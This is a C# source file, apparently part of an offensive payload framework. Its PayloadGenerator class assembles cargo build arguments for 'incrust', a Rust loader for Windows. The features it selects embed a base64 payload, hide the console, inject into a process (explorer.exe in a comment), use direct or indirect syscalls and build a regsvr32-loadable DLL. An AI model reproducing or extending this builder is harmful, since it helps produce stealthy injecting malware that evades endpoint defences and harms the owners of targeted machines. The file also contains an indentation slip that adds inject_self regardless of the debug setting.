using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload
{
    public partial class PayloadGenerator
    {
        public bool ExecIncrust(string[] parms)
        {
            return false;
        }

        public List<string> ComputeIncRustBuildParameters(PayloadGenerationOptions options, string payloadB64Path)
        {
            //--bin incrust --target x86_64-pc-windows-gnu --release --features=no_console,payload_b64,inject_proc_name,syscall_indirect --config "env.PAYLOAD_FILE_NAME.value='payload-x64.b64'" --config "env.PROCESS_NAME.value='explorer.exe'" 
            List<string> parms = new List<string>();
            parms.Add("build");

            if (options.Type == PayloadType.Library)
                parms.Add("--lib");
            else
            {
                parms.Add("--bin"); parms.Add("incrust");
            }

            if (!options.IsDebug)
                parms.Add("--release");

            parms.Add("--target");
            if(options.Architecture == PayloadArchitecture.x64)
                parms.Add("x86_64-pc-windows-gnu");
            else
                parms.Add("i686-pc-windows-gnu");

            string feat = "--features=payload_b64";
            if (!options.IsDebug)
                feat += ",no_console";
                feat += ",inject_self";
            if (options.Architecture == PayloadArchitecture.x64)
                feat += ",syscall_indirect";
            else
                feat += ",syscall_direct";

            if (options.Type == PayloadType.Library)
                feat += ",regsvr";
            parms.Add(feat);

            parms.Add("--config"); parms.Add($"env.PAYLOAD_FILE_NAME.value='{payloadB64Path}'");
            return parms;
        }

        public ExecuteResult IncRustBuild(List<string> parameters)
        {
            string cargoPath = @$"/home/{Environment.UserName}/.cargo/bin";
            this.MessageSent?.Invoke(this, $"[>] Executing: "+ Path.Combine(cargoPath, "cargo"));
            return ExecuteCommand(Path.Combine(cargoPath, "cargo"), parameters, this.Config.IncRustFolder);
        }

    }
}
